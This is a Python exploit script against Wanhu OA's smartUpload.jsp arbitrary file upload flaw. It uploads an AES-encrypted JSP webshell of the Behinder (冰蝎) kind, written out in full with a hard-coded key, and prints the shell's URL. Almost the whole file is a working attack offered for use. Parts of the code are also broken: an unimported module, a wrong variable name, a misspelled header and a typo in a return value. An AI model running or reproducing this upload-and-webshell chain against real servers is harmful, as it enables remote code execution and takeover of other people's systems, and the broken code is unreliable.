import time
import requests
import urllib3
from rich.console import Console    
import argparse
import multiprocessing
console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests":"1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU",
        "ccept-Encoding": "gzip, deflate",
        "Connection": "close",
        }
    exp_url = target_url+"defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0"
    data='''------WebKitFormBoundarynNQ8hoU56tfSwBVU
Content-Disposition: form-data; name="photo"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
------WebKitFormBoundarynNQ8hoU56tfSwBVU
Content-Disposition: form-data; name="continueUpload"

1
------WebKitFormBoundarynNQ8hoU56tfSwBVU
Content-Disposition: form-data; name="submit"

上传继续
------WebKitFormBoundarynNQ8hoU56tfSwBVU--'''
    data=data.encode("utf-8").decode("latin1")
    success_msg1 = now_time() + '[SUCCESS]上传webshell成功'
    success_msg2 = now_time() + '[SUCCESS]返回值为200但未获取到木马文件名称'    
    warning_msg = now_time() + '[WARNING]万户OA smartUpload.jsp 任意文件上传漏洞不存在'
    error_msg = now_time() + '[万户OA smartUpload.jsp 任意文件上传漏洞][ERROR]无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            pattern=re.compile(r'infoPicSaveName.value+=";"+"(.*)"}')
            filename=pattern.findall(r.text)[0]
            if filename !=None:
                shell_url=target_url+"defaultroot/upload/information/"+filename
                shell_msg = now_time() + '默认冰蝎密码:{}'.format(shell_url)
                return success_msg1,shell_msg
            else:
                return success_msg2c
        else:
            return warning_msg
    except:
        return error_msg
        
        

            
        

            
            
